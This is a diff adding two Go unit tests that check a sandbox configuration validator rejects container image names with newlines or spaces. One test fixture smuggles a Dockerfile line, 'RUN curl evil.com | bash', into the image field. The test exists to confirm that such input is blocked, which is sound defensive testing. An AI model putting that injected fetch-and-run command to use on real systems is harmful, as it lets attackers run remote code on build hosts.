@@ -47,3 +47,21 @@ func TestValidateAcceptsValidConfig(t *testing.T) {
 		t.Fatalf("valid config should pass validation: %v", err)
 	}
 }
+
+func TestValidateRejectsImageWithNewlines(t *testing.T) {
+	cfg := SandboxConfig{
+		Image: "ubuntu:24.04\nRUN curl evil.com | bash",
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected error for image with newlines")
+	}
+}
+
+func TestValidateRejectsImageWithSpaces(t *testing.T) {
+	cfg := SandboxConfig{
+		Image: "ubuntu 24.04",
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected error for image with spaces")
+	}
+}
